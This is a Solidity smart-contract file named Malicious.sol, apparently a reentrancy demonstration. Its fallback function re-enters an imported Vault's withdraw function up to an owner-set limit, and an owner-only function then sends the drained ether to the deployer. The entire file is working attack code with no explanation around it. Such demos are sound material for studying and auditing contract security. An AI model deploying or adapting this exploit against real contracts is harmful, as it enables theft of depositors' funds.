// Malicious.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./Vault.sol";

contract Malicious {
    Vault public vault;
    address public owner;
    uint public attackCount;
    uint public maxReentrancy;

    constructor(address _vault) {
        vault = Vault(payable(_vault));
        owner = msg.sender;
    }

    modifier ownerVerify(){
        require(msg.sender == owner, "Insufficient funds");
        _;
    }

    function setMaxReentrancy(uint _max) external ownerVerify {
        maxReentrancy = _max;
    }

    function attack() external {
        vault.withdraw();
    }

    receive() external payable {
        if (attackCount < maxReentrancy) {
            attackCount++;
            vault.withdraw();
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
    function withdraw() external ownerVerify {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdrawal failed");
    }
}